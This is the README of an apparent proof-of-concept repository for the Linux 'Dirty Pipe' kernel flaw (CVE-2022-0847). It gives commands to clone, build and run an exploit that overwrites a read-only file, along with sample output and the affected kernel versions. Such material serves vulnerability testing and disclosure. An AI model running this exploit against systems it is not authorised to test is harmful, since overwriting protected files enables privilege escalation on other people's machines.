# Dirty Pipe POC
CVE-2022-0847 POC - https://dirtypipe.cm4all.com/

## Description
This exploit attempts to use the `CVE-2022-0847` vulnerability to overwrite a read only file.

When `make exploit` is run, it will:
1. Create a `read_only_file.txt`
2. Execute the `dirtypipe` exploit.
3. Check if the `dirtypipe` exploit worked.
---
You can determine if your system is vulnerable by the output of `make exploit`:
```console
foo@bar:~$ make exploit # vulnerable
[*] Creating read_only_file.txt...
[*] Press any key to continue...
[*] Running exploit...
[*] Exploit was successful! 

foo@bar:~$ make exploit # not vulnerable
[*] Creating read_only_file.txt...
[*] Press any key to continue...
[*] Running exploit...
[!] Exploit was not successful!
```

## Usage
```console
foo@bar:~$ cd /tmp # We don't need to keep these files.
foo@bar:~$ git clone https://github.com/breachnix/dirty-pipe-poc && cd dirty-pipe-poc
foo@bar:~$ make && make exploit # make & cc will need to be installed.
```

## Affected
This vulnerability affects any kernel version higher than **5.8** but lower than **5.16.11**, **5.15.25**, or **5.10.102**.  
You can determine your kernel version by executing `uname -sr`:
```console
foo@bar:~$ uname -sr
Linux 5.10.0-12-amd64
```
